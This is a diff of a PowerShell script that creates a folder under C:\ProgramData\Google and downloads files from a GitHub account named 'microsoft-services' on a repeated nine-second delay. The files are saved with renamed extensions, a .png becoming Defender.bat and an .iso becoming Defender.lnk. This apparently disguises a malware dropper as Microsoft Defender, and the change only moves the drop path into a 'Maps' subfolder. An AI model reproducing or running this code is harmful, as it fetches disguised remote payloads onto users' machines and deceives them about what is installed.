@@ -1,7 +1,7 @@
 
 start-sleep -s 9
 
-[system.io.directory]::CreateDirectory("C:\ProgramData\Google\")
+[system.io.directory]::CreateDirectory("C:\ProgramData\Google\Maps\")
 
 start-sleep -s 9
 
@@ -19,11 +19,11 @@ else{
 
 start-sleep -s 9
 
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Defender.lnk') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
  
  start-sleep -s 9
   
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.png', 'C:\ProgramData\Google\Defender.bat') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.png', 'C:\ProgramData\Google\Maps\Defender.bat') }"
 
  start-sleep -s 9
 
